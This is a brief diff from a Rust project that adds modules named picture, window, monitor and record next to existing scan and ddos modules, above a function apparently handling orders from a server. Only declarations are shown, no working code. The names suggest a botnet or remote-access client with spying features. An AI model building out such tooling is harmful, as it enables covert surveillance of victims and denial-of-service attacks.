@@ -3,6 +3,10 @@ use std::thread;
 
 mod scan;
 mod ddos;
+mod picture;
+mod window;
+mod monitor;
+mod record;
 
 pub(crate) fn ordre_du_srv(mut ordre: String) {
 
